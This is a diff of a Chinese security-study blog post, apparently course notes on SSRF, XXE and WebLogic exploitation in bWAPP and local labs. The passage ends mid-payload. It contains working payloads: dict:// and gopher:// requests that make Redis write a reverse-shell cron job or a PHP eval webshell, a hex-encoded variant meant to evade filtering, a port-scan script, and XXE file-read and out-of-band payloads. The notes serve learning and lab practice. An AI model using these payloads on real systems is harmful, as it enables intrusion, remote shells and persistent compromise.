@@ -98,8 +98,21 @@
 <meta property="og:image" content="https://pic.imgdb.cn/item/6569959dc458853aefa3afb5.jpg">
 <meta property="og:image" content="https://pic.imgdb.cn/item/65699bf4c458853aefb63671.jpg">
 <meta property="og:image" content="https://pic.imgdb.cn/item/65699c54c458853aefb761a8.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/656d8117c458853aef29e255.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/656fc4b9c458853aef08c9d1.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/656fc511c458853aef097bce.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/656fe064c458853aef490b37.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657069c1c458853aeff9f789.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657069ecc458853aeffaafcd.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657bec9ac458853aef19b66f.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657bed51c458853aef1c8364.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657bef10c458853aef2394ed.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657bf20bc458853aef2fcc94.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657bf28bc458853aef320af9.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/657bf33fc458853aef352b7b.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/65802a60c458853aefed1a40.jpg">
 <meta property="article:published_time" content="2023-11-10T05:10:00.000Z">
-<meta property="article:modified_time" content="2023-12-01T09:10:43.507Z">
+<meta property="article:modified_time" content="2023-12-19T11:11:57.391Z">
 <meta property="article:author" content="noone___">
 <meta property="article:tag" content="网课">
 <meta name="twitter:card" content="summary">
@@ -306,7 +319,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-12-01 17:10:43" itemprop="dateModified" datetime="2023-12-01T17:10:43+08:00">2023-12-01</time>
+                <time title="修改时间：2023-12-19 19:11:57" itemprop="dateModified" datetime="2023-12-19T19:11:57+08:00">2023-12-19</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1090,8 +1103,241 @@
 </ul>
 </li>
 <li><p><code>SSRF</code> 探索利用</p>
+<p>  由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内网系统，而因为请求由服务端发起，所以能请求到与自身相连而与外网隔绝的内部系统</p>
+<p>  其关键是 <code>Web</code> 应用程序与其他设施或外部服务的新人关系</p>
+<p>  通过修改原始 <code>URL</code> 为 <code>127.0.0.1</code> 或 <code>localhost</code> ，使服务器能接受指向其自身的地址，从而令攻击者渗透进服务器文件系统</p>
 <ul>
-<li>服务器端请求伪造</li>
+<li><p>服务器端请求伪造</p>
+<p>  用 <code>curl($_GET[&#39;url&#39;])</code> 来做演示，其功能如下</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -vvv <span class="string">&#x27;dict://ip:port/info&#x27;</span> 查看对方主机信息</span><br><span class="line">curl -vvv <span class="string">&#x27;file:///etc/passwd&#x27;</span> 读本地文件</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用 <code>bWAPP</code> 中的 <code>ssrf</code> 模块做演示</p>
+<p>  可以在老大发的第一个学习靶机中找到已经配置好的，但感觉并没有配置好，建议用 <code>phpadmin</code> 自己搭，用 <code>docker</code> 的话也出了些问题</p>
+<p>  <img src="https://pic.imgdb.cn/item/656d8117c458853aef29e255.jpg" alt=""></p>
+<p>  给了三个例子，以第一个为例</p>
+<ul>
+<li><p><code>port scan</code></p>
+<p>  点进去后发现服务器上存有以下用于端口扫描的 <code>php</code> 脚本</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(\&quot;U 4r3 0wn3d by MME!!!\&quot;);&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;ip&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//list of port numbers to scan</span></span><br><span class="line">    <span class="variable">$ports</span> = <span class="keyword">array</span>(<span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">53</span>, <span class="number">80</span>, <span class="number">110</span>, <span class="number">1433</span>, <span class="number">3306</span>);</span><br><span class="line">    <span class="variable">$results</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$ports</span> <span class="keyword">as</span> <span class="variable">$port</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$pf</span> = @fsockopen(<span class="variable">$_REQUEST</span>[<span class="string">&quot;ip&quot;</span>], <span class="variable">$port</span>, <span class="variable">$err</span>, <span class="variable">$err_string</span>, <span class="number">1</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$results</span>[<span class="variable">$port</span>] = <span class="literal">true</span>;</span><br><span class="line">            fclose(<span class="variable">$pf</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$results</span>[<span class="variable">$port</span>] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$results</span> <span class="keyword">as</span> <span class="variable">$port</span>=&gt;<span class="variable">$val</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$prot</span> = getservbyport(<span class="variable">$port</span>,<span class="string">&quot;tcp&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Port <span class="subst">$port</span> (<span class="subst">$prot</span>): &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$val</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;span style=\&quot;color:green\&quot;&gt;OK&lt;/span&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;span style=\&quot;color:red\&quot;&gt;Inaccessible&lt;/span&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>  然后到本地文件包含模块 <code>Remote/Local inclusion</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/656fc4b9c458853aef08c9d1.jpg" alt=""></p>
+<p>  可以看到这里请求了 <code>lang_en.php</code> 文件，那么用这个来包含刚刚的脚本</p>
+<p>  <img src="https://pic.imgdb.cn/item/656fc511c458853aef097bce.jpg" alt=""></p>
+<p>  随后就能用服务端的身份进行端口扫描</p>
+</li>
+</ul>
+</li>
+<li><p><code>ssrf</code> 常用协议</p>
+<ul>
+<li><p><code>file</code> 协议</p>
+<p>  读取服务器本地文件，访问本地静态资源</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br><span class="line">file:///var/www/html/index.php</span><br><span class="line">file:///usr/local/apache-tomcat/conf/server.xm</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>dict</code> 协议</p>
+<p>  常用于探测内网主机以及端口开放情况，以及端口服务的指纹信息，或者执行一些服务的命令，如 <code>redis</code></p>
+<p>  其格式为 <code>dict://ip:port/command</code></p>
+<p>  对于多行命令，dict只能一次执行一行，所以需多次执行</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">一、dict协议探测端口和服务指纹</span><br><span class="line">dict://ip:port</span><br><span class="line">dict://127.0.0.1:port/info</span><br><span class="line"></span><br><span class="line">二、dict协议攻击redis，写入定时任务，进行反弹shell</span><br><span class="line">redis默认端口为6379</span><br><span class="line">centos系统定时任务的路径为：/var/spool/cron</span><br><span class="line">debian系统定时任务的路径为：/var/spool/cron/crontabs</span><br><span class="line"></span><br><span class="line">dict://127.0.0.1:6379/config:set:dbfilename:root</span><br><span class="line">dict://127.0.0.1:6379/config:set:dir:/var/spool/cron</span><br><span class="line">dict://127.0.0.1:6379/set:test:&quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\n\n&quot;</span><br><span class="line">dict://127.0.0.1:6379/save</span><br><span class="line"></span><br><span class="line">注意：若payload存在被转义或过滤的情况，可利用16进制写入内容</span><br><span class="line">dict://127.0.0.1:6379/set:test:&quot;\n\n\x2a/1\x20\x2a\x20\x2a\x20\x2a\x20\x2a\x20/bin/bash\x20\x2di\x20\x3e\x26\x20/dev/tcp/10.10.10.10/1234\x200\x3e\x261\n\n&quot;</span><br><span class="line"></span><br><span class="line">三、dict协议攻击redis，写入webshell</span><br><span class="line">dict://127.0.0.1:6379/config:set:dbfilename:test.php</span><br><span class="line">dict://127.0.0.1:6379/config:set:dir:/var/www/html</span><br><span class="line">dict://127.0.0.1:6379/set:test:&quot;\n\n&lt;?php @eval($_POST[x]);?&gt;\n\n&quot;</span><br><span class="line">dict://127.0.0.1:6379/save</span><br><span class="line"></span><br><span class="line">若存在过滤， 则利用16进制内容写入：</span><br><span class="line">dict://127.0.0.1:6379/set:test:&quot;\n\n\x3c\x3f\x70\x68\x70\x20\x40\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x78\x5d\x29\x3b\x3f\x3e\n\n&quot;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p><code>gopher</code> 协议</p>
+<p>  曾经应用广泛的信息查找系统，使用 <code>70</code> 端口，用来攻击 <code>redis</code> , <code>mysql</code> , <code>fastcgi</code> , <code>smtp</code> 等服务。</p>
+<p>  又称万金油协议，通过该协议发送各种格式的请求包以绕过漏洞不在 <code>GET</code> 参数</p>
+<p>  其格式为 <code>gopher://host:port/gopher_path</code></p>
+<p>  在 <code>gopher</code> 协议数据流中，<code>url</code> 编码使用 <code>%0d%0a</code> 替换回车换行，数据流末尾使用 <code>%0d%0a</code> 代表消息结束</p>
+<ul>
+<li><p>攻击 <code>redis</code> 服务</p>
+<p>  <code>redis</code> 服务的协议数据流格式如下，其中 <code>*[参数数量]</code> , <code>$[参数x的字节数量]</code></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*3</span><br><span class="line">$6</span><br><span class="line">config</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$3</span><br><span class="line">dir</span><br><span class="line">$13</span><br><span class="line">/var/www/html</span><br></pre></td></tr></table></figure>
+<p>  eg：<code>redis</code> 将反弹 <code>shell</code> 写入定时任务</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set ttt &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br><span class="line">quite</span><br></pre></td></tr></table></figure>
+<p>  其 <code>redis</code> 格式如下</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$3</span><br><span class="line">ttt</span><br><span class="line">$69</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">config</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$3</span><br><span class="line">dir</span><br><span class="line">$16</span><br><span class="line">/var/spool/cron/</span><br><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">config</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$10</span><br><span class="line">dbfilename</span><br><span class="line">$4</span><br><span class="line">root</span><br><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">save</span><br><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+<p>  用 <code>gopher</code> 协议攻击，<code>payload</code> 如下</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0attt%0d%0a$69%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>Gopherus</code></p>
+<p>  总是会有工具的，总会的</p>
+<p>  其可以自动化构造 <code>paylaod</code></p>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">github地址</a></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><code>XXE</code> 漏洞探索利用</p>
+<ul>
+<li><p><code>XML</code> 基础知识</p>
+<p>  作为一种标记语言，标记电子文件使其具有结构性，其标准结构如下</p>
+<p>  <img src="https://pic.imgdb.cn/item/656fe064c458853aef490b37.jpg" alt=""></p>
+<ul>
+<li><p>语法</p>
+<ul>
+<li>所有 <code>XML</code> 元素都有一个关闭标签</li>
+<li>标签对大小写敏感</li>
+<li>需要正确嵌套</li>
+<li><code>XML</code> 文档必须有根元素</li>
+<li><code>XML</code> 属性值必须加引号</li>
+<li><code>&lt;&gt;</code> 符号在 <code>XML</code> 中有特殊含义，所以用对应的 <code>html</code> 实体来表示，即 <code>&amp;lt</code> <code>&amp;gt</code></li>
+<li>其空格会被保留，即 <code>&lt;p&gt;a[space]b&lt;/p&gt;</code></li>
+</ul>
+</li>
+<li><p>文档结构</p>
+<ul>
+<li><p>元素</p>
+<p>  <code>XML</code> 主要构建模块，可包含文本，其他元素，或空</p>
+  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> body text in between <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>属性</p>
+<p>  提供有关元素的额外信息</p>
+  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;computer.gif&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>  <code>src</code> 即为元素 <code>img</code> 的属性</p>
+</li>
+</ul>
+</li>
+<li><p><code>DTD</code> ：文档类型定义</p>
+<p>  定义 <code>XML</code> 文档的合法构建模块，即说明哪些元素/属性合法以及应怎样嵌套</p>
+<p>  可以内部声明或外部引用</p>
+<ul>
+<li><p>内部</p>
+<p>  <code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
+  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span>  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>(<span class="meta-keyword">#PCDATA</span>)&gt;</span>  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>(<span class="meta-keyword">#PCDATA</span>)&gt;</span>  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span>(<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+<p>  内部声明，先定义了此文档为 <code>note</code> 类型。随后定义 <code>note</code> 类型有四个元素 <code>to,from,heading,body</code></p>
+<p>  随后将这四个元素定义为 <code>#PCDATA</code> 类型</p>
+</li>
+<li><p>外部</p>
+<p>  <code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></p>
+  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;note.dtd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>  <code>note.dtd</code>:</p>
+  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><code>XXE</code></p>
+<p>  即 <code>XML</code> 外部实体注入，即 <code>DTD</code> 外部实体。而其的原因是在解析 <code>XML</code> 的时候，对恶意的外部实体进行解析导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起 <code>dos</code> 攻击等危害</p>
+<p>  然而在 <code>libxml2.9.0</code> 后，默认不解析外部实体，<code>PHP</code> 版本不影响 <code>XXE</code> 利用</p>
+<ul>
+<li><p>回显 <code>XXE</code></p>
+<p>  以 <code>bwapp</code> 的 <code>XXE</code> 模块为例</p>
+<p>  <img src="https://pic.imgdb.cn/item/657069c1c458853aeff9f789.jpg" alt=""></p>
+<p>  抓包得到存在 <code>xml</code> ，尝试修改数据</p>
+<p>  <img src="https://pic.imgdb.cn/item/657069ecc458853aeffaafcd.jpg" alt=""></p>
+<p>  发现服务器会解析 <code>xml</code> 内容</p>
+<p>  那么构造 <code>payload</code> 即可注入</p>
+  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span>[<span class="meta">&lt;!ENTITY <span class="meta-keyword">bee</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/Users/Administrator/Desktop/flag.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span><span class="symbol">&amp;bee;</span><span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>  理论上说这能输出桌面的 <code>flag</code> 文件内容，但是笔者靶机这里出锅了复现失败，根据 <code>github</code> 改 <code>xxe-2.php</code> 的 <code>$xml</code> 函数值也没有用</p>
+</li>
+<li><p>无回显 <code>XXE</code></p>
+<p>  大多数条件下，<code>XXE</code> 并不会用于输出，所以要考虑将数据外带</p>
+<ul>
+<li><p>判断</p>
+<p>  对于正常<strong>可以联网</strong>的靶机，我们可以使用以下操作来判断其是否存在 <code>XXE</code> ，借用 <a target="_blank" rel="noopener" href="http://www.dnslog.cn/">dnslog</a></p>
+  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://noone.kerfmc.dnslog.cn&quot;</span>&gt;</span>%remote;]&gt;</span></span><br></pre></td></tr></table></figure>
+<p>  然后可以在网站中收到记录</p>
+</li>
+<li><p>读取文件</p>
+<p>  往往用 <code>xml</code> 来调用靶机以外的 <code>xml</code> 文件来攻击，以此避免过滤</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><code>Weblogic</code> 系列</p>
+<ul>
+<li><p><code>Weblogic</code> 漏洞利用实践</p>
+<p>  这里选用的是 <code>Weblogic10.3.6</code> 版本，这一版本漏洞最多，便于实验</p>
+<p>  <a target="_blank" rel="noopener" href="https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html">下载连接</a></p>
+<p>  安装完成后可以在 <code>Oracle\Middleware\user_projects\domains\base_domain</code> 找到</p>
+<p>  <img src="https://pic.imgdb.cn/item/657bec9ac458853aef19b66f.jpg" alt=""></p>
+<p>  <img src="https://pic.imgdb.cn/item/657bed51c458853aef1c8364.jpg" alt=""></p>
+<ul>
+<li><p>弱密码爆破</p>
+<p>  很简单的部分，过程略了，但要求控制台关闭了用户控制</p>
+<p>  <img src="https://pic.imgdb.cn/item/657bef10c458853aef2394ed.jpg" alt=""></p>
+</li>
+<li><p><code>SSRF(CVE-2014-4210)</code></p>
+<p>  在 <code>ip:port/uddiexplorer</code> 中，可以看到输入框，随便输点到 <code>burp</code> 里面看</p>
+<p>  <img src="https://pic.imgdb.cn/item/657bf20bc458853aef2fcc94.jpg" alt=""></p>
+<p>  更改发送包中的数据，可以发现返回也随之改变</p>
+<p>  <img src="https://pic.imgdb.cn/item/657bf28bc458853aef320af9.jpg" alt=""></p>
+<p>  尝试 <code>ssrf</code> ，让 <code>operator</code> 访问攻击机端口，并开端口监听</p>
+<p>  <img src="https://pic.imgdb.cn/item/657bf33fc458853aef352b7b.jpg" alt=""></p>
+<p>  可以验证其确实存在 <code>ssrf</code> 漏洞了</p>
+<ul>
+<li><p>端口扫描/内网主机扫描</p>
+<p>  用 <code>靶机:port</code> 探测端口开放情况</p>
+<p>  可以用<a target="_blank" rel="noopener" href="https://github.com/ZH3FENG/Weblogic_SSRF/blob/master/weblogic_ssrf.py">脚本</a></p>
+<ol>
+<li>主机存活且端口开放，会返回状态码。</li>
+<li>开放端口但非 HTTP 协议则会返回 did not have a valid SOAP content-type: text/html</li>
+<li>不存在的主机或端口时，返回 could not connect over HTTP to server</li>
+</ol>
+<p>如果知道了内网的更多信息，还可以做更多事，向定时计划中写入反弹 <code>shell</code> 等</p>
+<p>比如<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43531669/article/details/128985507">这篇文章</a>，对于靶机内网存在 <code>Redis</code> 未授权漏洞的，可以用 <code>ssrf</code> 写入反弹 <code>shell</code></p>
+</li>
+</ul>
+</li>
+<li><p><code>XML</code> 反序列化</p>
+<ul>
+<li><p>原理：</p>
+<p>  <code>Weblogic</code> 的 <code>WLS Security</code> 组件对外提供 <code>webservice</code> 服务，其中使用了 <code>XMLDecoder</code> 来解析用户传入的 <code>XML（SOAP协议）数据</code> ，在解析的过程中出现反序列化漏洞，导致任意代码执行。</p>
+<p>  出问题的包是 <code>wls-wsat</code> 、 <code>_async</code></p>
+</li>
+<li><p>演示</p>
+<p>  在 <code>ip:port/wls-wsat/</code> 下面的子目录，都是在 <code>wls-wsat.war</code> 里面 <code>WEB-INF/web.xml</code> 定义的 <code>servlet</code></p>
+  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>
+<p>  这里以第一个为例</p>
+<p>  先将数据包改成可以提交 <code>xml</code> 的样子：</p>
+<ol>
+<li>改为<code>POST</code> 类型</li>
+<li>加上 <code>Content-Type: text/xml</code></li>
+<li><p>构造 <code>payload</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span 